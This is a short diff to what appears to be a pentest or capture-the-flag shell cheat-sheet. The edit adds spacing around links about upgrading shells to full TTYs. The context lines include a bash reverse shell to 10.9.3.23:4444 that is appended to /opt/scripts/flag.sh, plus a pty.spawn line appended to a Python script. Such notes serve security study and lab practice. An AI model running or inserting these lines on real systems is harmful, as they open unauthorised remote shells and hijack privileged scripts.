@@ -21,9 +21,10 @@ echo 'import pty;pty.spawn("/bin/bash")' >> /tmp/shop.py
 echo "bash -i >& /dev/tcp/10.9.3.23/4444 0>&1" >> /opt/scripts/flag.sh
 export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games
 ```
-
 [full-ttys](https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/full-ttys)
+
 [spawning-tty-shells](https://hideandsec.sh/books/cheatsheets-82c/page/spawning-tty-shells)
+
 [upgrading-simple-shells-to-fully-interactive-ttys](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys)
 
 # Payloads_Shell ✅
